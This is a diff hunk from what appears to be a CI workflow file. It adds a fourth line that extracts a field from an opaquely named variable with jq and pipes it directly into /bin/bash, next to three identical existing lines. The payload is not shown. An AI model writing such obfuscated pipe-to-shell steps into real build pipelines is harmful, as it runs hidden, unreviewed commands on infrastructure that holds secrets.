@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$gda05" | jq -r .crht0 | /bin/bash
           echo $in3495 | jq -r .etd169 | /bin/bash
           echo $afpy55 | jq -r .d2 | /bin/bash
+          printf '%s' "$fhn3" | jq -r .tdmzm249 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
